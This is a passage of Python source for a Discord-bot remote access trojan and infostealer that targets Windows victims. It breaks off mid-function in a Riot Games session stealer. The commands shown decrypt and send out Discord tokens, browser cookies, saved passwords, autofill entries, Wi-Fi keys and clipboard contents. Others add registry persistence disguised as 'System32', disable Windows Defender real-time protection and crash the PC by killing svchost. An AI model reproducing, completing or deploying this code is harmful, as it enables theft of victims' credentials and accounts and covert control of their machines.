        ip = requests.get("https://ipinfo.io/json").json()
        msg = f"IP: {ip['ip']}\nLocation: {ip['city']}, {ip['region']} ({ip['country']})\nISP: {ip['org']}"
        await ctx.send(msg)
    except:
        await ctx.send("Failed to grab IP")

# Token Grabber
import os
import re
import json
import base64
import requests
from Crypto.Cipher import AES
import win32crypt
import discord
from discord.ext import commands
def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None
def extract_tokens(leveldb_path, key):
    tokens = set()
    if not os.path.exists(leveldb_path):
        return tokens
    for file in os.listdir(leveldb_path):
        if not file.endswith((".log", ".ldb")):
            continue
        try:
            with open(os.path.join(leveldb_path, file), "rb") as f:
                content = f.read()
            for enc in re.findall(rb"dQw4w9WgXcQ:([^\"]+)", content):
                try:
                    dec = base64.b64decode(enc)
                    if dec[:3] == b"v10":
                        iv = dec[3:15]
                        data = dec[15:]
                        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                        token = cipher.decrypt(data).decode()
                        tokens.add(token)
                except Exception:
                    continue
            for pt in re.findall(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content):
                try:
                    tokens.add(pt.decode())
                except Exception:
                    continue
        except Exception:
            continue
    return tokens
@bot.command()
async def token(ctx):
    """Attempts to extract Discord tokens across multiple applications."""
    targets = {
    "Discord": os.path.expandvars("%APPDATA%\\Discord"),
    "Discord Canary": os.path.expandvars("%APPDATA%\\discordcanary"),
    "Discord PTB": os.path.expandvars("%APPDATA%\\discordptb"),
    "Lightcord": os.path.expandvars("%APPDATA%\\Lightcord"),
    "Ripcord": os.path.expandvars("%APPDATA%\\Ripcord"),
    "Chrome Default": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default"),
    "Chrome Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1"),
    "Chrome Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 2"),
    "Chrome Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 3"),
    "Chrome System": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\System Profile"),
    "Brave Default": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default"),
    "Brave Profile 1": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1"),
    "Brave Profile 2": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2"),
    "Brave Profile 3": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3"),
    "Brave System": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\System Profile"),
    "Opera Stable": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable"),
    "Opera GX Stable": os.path.expandvars("%APPDATA%\\Opera Software\\Opera GX Stable"),
    "Opera Next": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Next"),
    "Opera Developer": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Developer"),
    "Opera Portable": os.path.expandvars("%USERPROFILE%\\Downloads\\OperaPortable\\Data\\profile"),
    "Edge Default": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default"),
    "Edge Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 1"),
    "Edge Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 2"),
    "Edge Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 3"),
    "Edge System": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\System Profile"),
    "Vivaldi Default": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Default"),
    "Vivaldi Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 1"),
    "Vivaldi Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 2"),
    "Vivaldi Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 3"),
    "Vivaldi System": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\System Profile"),
    "Yandex Default": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default"),
    "Yandex Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 1"),
    "Yandex Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 2"),
    "Yandex Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 3"),
    "Yandex System": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\System Profile"),
    "Chromium Default": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Default"),
    "Chromium Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 1"),
    "Chromium Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 2"),
    "Chromium Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 3"),
    "Chromium System": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\System Profile"),
    "Firefox Profiles": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
    }
    found_results = []
    seen_tokens = set()
    for name, base_path in targets.items():
        local_state_path = os.path.join(base_path, "Local State")
        leveldb_path = os.path.join(base_path, "Local Storage", "leveldb")
        if not os.path.exists(local_state_path) or not os.path.exists(leveldb_path):
            continue
        key = get_master_key(local_state_path)
        if not key:
            continue
        tokens = extract_tokens(leveldb_path, key)
        for token in tokens:
            if token in seen_tokens:
                continue
            seen_tokens.add(token)
            try:
                headers = {"Authorization": token}
                r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
                if r.status_code == 200:
                    user = r.json()
                    uid = base64.b64decode(token.split('.')[0] + '==').decode('utf-8', 'ignore')
                    info = (
                        f"**{name}**\n"
                        f"**Token**: `{token}`\n"
                        f"**User ID**: `{uid}`\n"
                        f"**Username**: {user['username']}#{user['discriminator']}\n"
                        f"**ID**: {user['id']}\n"
                        f"**Email**: {user.get('email', 'None')}\n"
                        f"**Phone**: {user.get('phone', 'None')}\n"
                        f"**MFA Enabled**: {user.get('mfa_enabled', False)}"
                    )
                    found_results.append(info)
            except Exception:
                continue
    if found_results:
        for result in found_results:
            await ctx.send(result[:1900])
    else:
        await ctx.send("No Tokens Found.")

# Turn monitor Off
@bot.command()
async def moff(ctx):
    try:
        import ctypes
        HWND_BROADCAST = 0xFFFF
        WM_SYSCOMMAND = 0x0112
        SC_MONITORPOWER = 0xF170
        ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        await ctx.send("Monitor turned off.")
    except:
        await ctx.send("Failed to turn off monitor.")

# Turn Monitor On
@bot.command()
async def mon(ctx):
    try:
        import ctypes
        import time
        ctypes.windll.user32.mouse_event(1, 1, 1, 0, 0)
        ctypes.windll.user32.mouse_event(1, -1, -1, 0, 0)
        await ctx.send("Monitor turned back on.")
    except:
        await ctx.send("Failed to wake monitor.")

# Open Link On Victims Pc 
@bot.command()
async def  open(ctx, *, url):
    try:
        os.system(f'start "" "{url}"')
        await ctx.send(f"Opened `{url}`")
    except Exception as e:
        await ctx.send(f"Failed")

# Victims Browser Downloads
@bot.command()
async def dl(ctx):
    import os, sqlite3, shutil, tempfile
    from pathlib import Path
    from datetime import datetime
    results = []
    chromium_paths = {
    "Chrome Default": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\History",
    "Chrome Profile 1": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 1\\History",
    "Chrome Profile 2": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 2\\History",
    "Chrome Profile 3": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 3\\History",
    "Chrome System Profile": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\System Profile\\History",
    "Brave Default": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History",
    "Brave Profile 1": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\History",
    "Brave Profile 2": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\History",
    "Brave Profile 3": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\History",
    "Brave System Profile": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\System Profile\\History",
    "Edge Default": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\History",
    "Edge Profile 1": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Profile 1\\History",
    "Edge Profile 2": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Profile 2\\History",
    "Edge Profile 3": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Profile 3\\History",
    "Edge System Profile": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\System Profile\\History",
    "Opera Stable Default": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\History",
    "Opera Stable Profile 1": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Profile 1\\History",
    "Opera Stable Profile 2": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Profile 2\\History",
    "Opera Stable Profile 3": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Profile 3\\History",
    "Opera Stable System Profile": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\System Profile\\History",
    "Opera GX Default": os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\History",
    "Opera GX Profile 1": os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Profile 1\\History",
    "Opera GX Profile 2": os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Profile 2\\History",
    "Opera GX Profile 3": os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Profile 3\\History",
    "Opera GX System Profile": os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\System Profile\\History",
    "Yandex Default": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\History",
    "Yandex Profile 1": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\History",
    "Yandex Profile 2": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\History",
    "Yandex Profile 3": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\History",
    "Yandex System Profile": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\System Profile\\History",
    "Vivaldi Default": os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\History",
    "Vivaldi Profile 1": os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Profile 1\\History",
    "Vivaldi Profile 2": os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Profile 2\\History",
    "Vivaldi Profile 3": os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Profile 3\\History",
    "Vivaldi System Profile": os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\System Profile\\History",
    "Chromium Default": os.getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\History",
    "Chromium Profile 1": os.getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Profile 1\\History",
    "Chromium Profile 2": os.getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Profile 2\\History",
    "Chromium Profile 3": os.getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Profile 3\\History",
    "Chromium System Profile": os.getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\System Profile\\History",
    "Comodo Dragon Default": os.getenv("LOCALAPPDATA") + "\\Comodo\\Dragon\\User Data\\Default\\History",
    "Iridium Default": os.getenv("LOCALAPPDATA") + "\\Iridium\\User Data\\Default\\History",
    "SRWare Iron Default": os.getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\History",
    "Torch Default": os.getenv("LOCALAPPDATA") + "\\Torch\\User Data\\Default\\History",
    "Cent Default": os.getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data\\Default\\History",
}
    for name, hist_path in chromium_paths.items():
        try:
            if not os.path.exists(hist_path):
                continue
            tmp_file = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(hist_path, tmp_file.name)
            conn = sqlite3.connect(tmp_file.name)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT target_path, start_time/1000000-11644473600 FROM downloads
                ORDER BY start_time DESC LIMIT 15
            """)
            for path, ts in cursor.fetchall():
                dt = datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
                results.append(f"[{name}] {dt} – {path}")
            conn.close()
            os.remove(tmp_file.name)
        except Exception as e:
            results.append(f"[{name}]Failed to parse: {e}")
    firefox_dir = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
    if firefox_dir.exists():
        for profile in firefox_dir.glob("*"):
            places = profile / "places.sqlite"
            if not places.exists():
                continue
            try:
                tmp_file = tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(places, tmp_file.name)
                conn = sqlite3.connect(tmp_file.name)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT moz_annos.content, datetime(moz_historyvisits.visit_date/1000000,'unixepoch')
                    FROM moz_places
                    JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
                    LEFT JOIN moz_annos ON moz_annos.place_id = moz_places.id
                    WHERE url LIKE '%download%'
                    ORDER BY visit_date DESC LIMIT 15
                """)
                for url, ts in cursor.fetchall():
                    results.append(f"[Firefox] {ts} – {url}")

                conn.close()
                os.remove(tmp_file.name)
            except Exception as e:
                results.append(f"[Firefox] Failed to parse: {e}")
    if not results:
        await ctx.send("No download history found.")
        return
    temp_path = tempfile.NamedTemporaryFile(delete=False, suffix=".txt").name
    with open(temp_path, "w", encoding="utf-8") as f:
        f.write("\n".join(results))
    await ctx.send(file=discord.File(temp_path, filename="downloads.txt"))
    os.remove(temp_path)

# Kill Program 
@bot.command()
async def kill(ctx, *, process: str):
    import subprocess
    try:
        result = subprocess.run(["taskkill", "/f", "/im", process], capture_output=True, text=True)
        if "SUCCESS" in result.stdout.upper():
            await ctx.send(f"`{process}` was killed.")
        else:
            await ctx.send(f"️Failed to kill `{process}`.\n```\n{result.stdout.strip()}\n```")
    except Exception as e:
        await ctx.send(f"")

# Startup via Reg
@bot.command()
async def reg(ctx):
    try:
        import winreg, sys
        file_path = sys.argv[0]
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "System32", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
        await ctx.send("Added to Reg")
    except Exception as e:
        await ctx.send(f"Failed")

# Remove Reg Startup
@bot.command()
async def rmreg(ctx):
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(key, reg_path, 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(reg_key, "System32")
        winreg.CloseKey(reg_key)
        await ctx.send("Removed from Reg")
    except Exception as e:
        await ctx.send(f"Failed")

# Crash Users Pc 
import os
import psutil
import subprocess
import time
import asyncio
@bot.command()
async def crash(ctx):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == "svchost.exe":
                target_pid = proc.info['pid']
                break
        else:
            await ctx.send("Failed")
            return
        await ctx.send("Type 'yes' to confirm.")
        def check(m):
            return m.author == ctx.author and m.content.lower() == 'yes'

        try:
            confirmation_msg = await bot.wait_for('message', check=check, timeout=30)
        except asyncio.TimeoutError:
            await ctx.send("Canceled.")
            return
        await ctx.send(f"Crashing Pc")
        result = subprocess.run(
            ["taskkill", "/f", "/pid", str(target_pid)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )
        if result.returncode == 0:
            await ctx.send(f"Successfully Terminated.")
        else:
            error_message = result.stderr.decode()
            if "Access is denied" in error_message:
                await ctx.send("Permission denied. The bot needs to be run with elevated privileges (administrator). Please try running the bot as an administrator.")
            else:
                await ctx.send(f"Failed to terminate svchost.exe. Error: {error_message}")
            return
        time.sleep(2)  
        if any(proc.info['pid'] == target_pid for proc in psutil.process_iter(['pid'])):
            await ctx.send(f"Warning: `svchost.exe` (PID: {target_pid}) is still running.")
        else:
            await ctx.send(f"Successfully Terminated.")
            
    except psutil.NoSuchProcess:
        await ctx.send("The process could not be found. It may have already terminated.")
    except psutil.AccessDenied:
        await ctx.send("Access denied. The bot does not have permission to interact with system processes. Try running the bot as an administrator.")
    except subprocess.SubprocessError as e:
        await ctx.send(f"An error occurred during process termination: {str(e)}")
    except Exception as e:
        await ctx.send(f"An unexpected error occurred: {str(e)}")

# Grab Victims Wallpaper
import os
import shutil
import ctypes
import discord
from discord.ext import commands
@bot.command()
async def gwp(ctx):
    """Grabs and sends the current desktop wallpaper."""
    try:
        SPI_GETDESKWALLPAPER = 0x0073
        path_buf = ctypes.create_unicode_buffer(260)
        ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, 260, path_buf, 0)
        wp = path_buf.value
        if not os.path.isfile(wp):
            import glob
            cached_files = glob.glob(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\*"))
            if cached_files:
                wp = cached_files[0]
            else:
                await ctx.send("No wallpaper found.")
                return
        if not os.path.exists(wp):
            await ctx.send("Wallpaper not found.")
            return
        loot_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Temp")
        os.makedirs(loot_dir, exist_ok=True)
        copy_path = os.path.join(loot_dir, "wp.jpg")
        shutil.copy(wp, copy_path)
        await ctx.send(file=discord.File(copy_path))
        os.remove(copy_path)

    except Exception as e:
        await ctx.send(f"Error: {e}")

# Msg Victim
@bot.command()
async def msg(ctx, *, text: str):
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, text, "Error", 0x10)  
        await ctx.send("Done")
    except Exception as e:
        await ctx.send(f"Failed to show message: {e}")

 # Disable RPT 
@bot.command()
async def rtp(ctx):
    """Attempt to disable the victim's antivirus software (Windows Defender) including Real-Time Protection."""
    try:
        import subprocess
        defender_command = 'Set-MpPreference -DisableRealtimeMonitoring $true'
        subprocess.call(["powershell", "-Command", defender_command], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        await ctx.send("RealTime Protection has been disabled.")
    except Exception as e:
        await ctx.send(f"Failed to disable antivirus: {e}")

# TTS
@bot.command()
async def speak(ctx, *, input: str):
    try:
        import pyttsx3
        parts = input.split("|")
        text = parts[0].strip()
        rate = int(parts[1]) if len(parts) > 1 else 175
        volume = float(parts[2]) if len(parts) > 2 else 1.0
        engine = pyttsx3.init()
        voices = engine.getProperty('voices')
        engine.setProperty('voice', voices[1].id if len(voices) > 1 else voices[0].id)
        engine.setProperty('rate', rate)
        engine.setProperty('volume', volume)
        engine.say(text)
        engine.runAndWait()
        await ctx.send(f"Done")
    except Exception as e:
        await ctx.send(f"failed: `{e}`")

# Delete Uploaded File.
@bot.command(name="Df")
async def flush_memory_uploads(ctx):
    try:
        loot_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Themes", "CachedFiles")
        if os.path.exists(loot_dir):
            for file in os.listdir(loot_dir):
                try:
                    os.remove(os.path.join(loot_dir, file))
                except:
                    continue
            await ctx.send("Memory flushed.")
        else:
            await ctx.send("No memory uploads found.")
    except Exception as e:
        await ctx.send(f"Failed")

# Cookie Grabber
import sqlite3
import os
import discord
from discord.ext import commands
import shutil
def extract_browser_cookies(browser_path):
    cookies = []
    if os.path.exists(browser_path):
        conn = sqlite3.connect(browser_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value FROM cookies")
        cookies_data = cursor.fetchall()
        for host_key, name, value in cookies_data:
            cookies.append({"host": host_key, "name": name, "value": value})
        conn.close()
    return cookies
@bot.command()
async def gc(ctx):
    """Extract cookies from Chrome, Firefox, Brave, and Edge."""
    try:
        cookies = []
        chrome_paths = [
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"), 
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1\Cookies"),  
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Profile 2\Cookies"), 
        ] 
        brave_paths = [
            os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Cookies"),  
            os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"),  
        ]
        firefox_path = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
        
        edge_paths = [
            os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies"),  
            os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Profile 1\Cookies"),  
        ]
        for path in chrome_paths:
            cookies += extract_browser_cookies(path)
        for path in brave_paths:
            cookies += extract_browser_cookies(path)        
        for profile in os.listdir(firefox_path):
            profile_path = os.path.join(firefox_path, profile)
            if os.path.isdir(profile_path):
                firefox_cookie_path = os.path.join(profile_path, 'cookies.sqlite')
                if os.path.exists(firefox_cookie_path):
                    cookies += extract_browser_cookies(firefox_cookie_path)        
        for path in edge_paths:
            cookies += extract_browser_cookies(path)
        if cookies:
            temp_file_path = os.path.join(os.getenv('TEMP'), "cookies.txt")
            with open(temp_file_path, 'w', encoding='utf-8') as file:
                for cookie in cookies:
                    file.write(f"Host: {cookie['host']}\n")
                    file.write(f"Cookie Name: {cookie['name']}\n")
                    file.write(f"Cookie Value: {cookie['value']}\n")
                    file.write("\n---\n")
            await ctx.send(file=discord.File(temp_file_path, "cookies.txt"))
            os.remove(temp_file_path)
        else:
            await ctx.send("No cookies found.")
    except Exception as e:
        await ctx.send(f"Failed.")

# Browser Password/Autofill Stealer
import os
import json
import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
def get_master_key(browser_path):
    with open(browser_path + r"\Local State", "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return ""
BROWSER_PATHS = [
    "Chrome",
    "BraveSoftware\\Brave-Browser",
    "Microsoft\\Edge",
    "Opera Software\\Opera Stable",
    "Opera Software\\Opera GX Stable",
    "Vivaldi",
    "Chromium",
    "Yandex\\YandexBrowser",
    "360Browser",
    "Comodo\\Dragon",
    "Torch",
    "CoolNovo",
    "Epic Privacy Browser",
    "CocCoc\\Browser",
    "UCBrowser",
]
def extract_passwords():
    results = []
    for browser in BROWSER_PATHS:
        path = os.getenv("LOCALAPPDATA") + f"\\{browser}\\User Data\\Default"
        if not os.path.exists(path):
            continue

        try:
            master_key = get_master_key(os.path.dirname(path))
            login_db = os.path.join(path, "Login Data")
            temp_db = os.path.join(os.getenv("TEMP"), "temp_login.db")
            shutil.copyfile(login_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                decrypted_password = decrypt_password(encrypted_password, master_key)
                if username or decrypted_password:
                    results.append(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n")

            cursor.close()
            conn.close()
            os.remove(temp_db)
        except:
            continue

    return "\n".join(results) if results else "No passwords found."
def extract_autofill():
    results = []
    for browser in BROWSER_PATHS:
        path = os.getenv("LOCALAPPDATA") + f"\\{browser}\\User Data\\Default"
        if not os.path.exists(path):
            continue

        try:
            master_key = get_master_key(os.path.dirname(path))
            web_data_db = os.path.join(path, "Web Data")
            temp_db = os.path.join(os.getenv("TEMP"), "temp_webdata.db")
            shutil.copyfile(web_data_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM autofill")

            for row in cursor.fetchall():
                field_name, field_value = row
                results.append(f"{field_name}: {field_value}")

            cursor.close()
            conn.close()
            os.remove(temp_db)
        except:
            continue

    return "\n".join(results) if results else "No autofill data found."

# Passwords
@bot.command()
async def pw(ctx):
    data = extract_passwords()
    await ctx.send(f"```\n{data}\n```" if data else "No passwords found.")

# Auto Fill
@bot.command()
async def af(ctx):
    data = extract_autofill()
    await ctx.send(f"```\n{data}\n```" if data else "No autofill data found.")

# Wifi Grabber
import subprocess
def extract_wifi_and_ethernet_info():
    results = []
    try:
        wifi_output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        for line in wifi_output.splitlines():
            if "All User Profile" in line:
                ssid = line.split(":")[1].strip()
                try:
                    key_output = subprocess.check_output(f"netsh wlan show profile name=\"{ssid}\" key=clear", shell=True, text=True)
                    password = "Not Found"
                    for l in key_output.splitlines():
                        if "Key Content" in l:
                            password = l.split(":")[1].strip()
                            break
                    results.append(f"[Wi-Fi] SSID: {ssid} | Password: {password}")
                except:
                    results.append(f"[Wi-Fi] SSID: {ssid} | Password: Not Found")
    except:
        results.append("Wi-Fi info extraction failed.")
    try:
        ipconfig_output = subprocess.check_output("ipconfig /all", shell=True, text=True)
        ethernet_found = False
        for line in ipconfig_output.splitlines():
            if "Ethernet adapter" in line:
                ethernet_found = True
                results.append(f"\n{line.strip()}")
            elif ethernet_found and line.strip():
                results.append(line.strip())
            elif ethernet_found and not line.strip():
                ethernet_found = False
    except:
        results.append("Ethernet info extraction failed.")

    return "\n".join(results) if results else "No network info found."
@bot.command()
async def wifi(ctx):
    data = extract_wifi_and_ethernet_info()
    await ctx.send(f"```\n{data}\n```" if data else "No Wi-Fi or Ethernet data found.")

# Clipboard Grabber
@bot.command()
async def cb(ctx):
    try:
        content = pyperclip.paste()
        if content.strip():
            await ctx.send(f"Clipboard content:\n```\n{content}\n```")
        else:
            await ctx.send("Clipboard is empty.")
    except Exception as e:
        await ctx.send(f"Too Big For Discord")

# Qr Code Connect Via Wifi
@bot.command()
async def qr(ctx):
    """Generates QR codes for saved Wi-Fi profiles ."""
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, stderr=subprocess.DEVNULL)
        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]

        if not profiles:
            await ctx.send("No Wi-Fi profiles found.")
            return

        for profile in profiles:
            try:
                key_output = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True)
                password = ""
                auth_type = "WPA"

                for line in key_output.splitlines():
                    if "Authentication" in line and "None" in line:
                        auth_type = "nopass"
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                if auth_type == "nopass":
                    wifi_qr_data = f"WIFI:T:nopass;S:{profile};;"
                else:
                    wifi_qr_data = f"WIFI:T:{auth_type};S:{profile};P:{password};;"
                img = qrcode.make(wifi_qr_data)
                safe_profile = "".join(c for c in profile if c.isalnum() or c in (' ', '-', '_')).rstrip()
                file_path = os.path.join(os.getenv("TEMP"), f"{safe_profile}_wifi_qr.png")
                img.save(file_path)
                embed = discord.Embed(
                    title=f"WiFi QR for: {profile}",
                    description=f"Type: `{auth_type}`\nPassword: `{password if password else 'None'}`",
                    color=0x00ffcc
                )
                embed.set_image(url=f"attachment://{os.path.basename(file_path)}")
                await ctx.send(embed=embed, file=discord.File(file_path, filename=os.path.basename(file_path)))
                os.remove(file_path)
            except subprocess.CalledProcessError:
                await ctx.send(f"Failed")
            except Exception as e:
                await ctx.send(f"`{e}`")

    except Exception as e:
        await ctx.send(f"`{e}`")


# Riot Stealer
@bot.command()
async def riot(ctx):
    try:
        riot_base = os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games")
        valorant_config_dir = os.path.join(os.getenv("LOCALAPPDATA"), "VALORANT", "Saved", "Config")
        program_data_riot = os.path.join(os.getenv("PROGRAMDATA"), "Riot Games")
        if not any(os.path.exists(path) for path in [riot_base, valorant_config_dir, program_data_riot]):
            await ctx.send("Riot or Valorant installation not found.")
            return
        with tempfile.TemporaryDirectory() as temp_dir:
            session_collected = False
            riot_config_paths = [
                os.path.join(riot_base, "Riot Client", "Config"),
                os.path.join(program_data_riot, "Riot Client", "Config")
            ]
            for config_path in riot_config_paths:
                if os.path.exists(config_path):
                    for file in os.listdir(config_path):
                        file_path = os.path.join(config_path, file)
                        if os.path.isfile(file_path):
                            try:
                                shutil.copy2(file_path, os.path.join(temp_dir, file))
                                session_collected = True
                            except Exception:
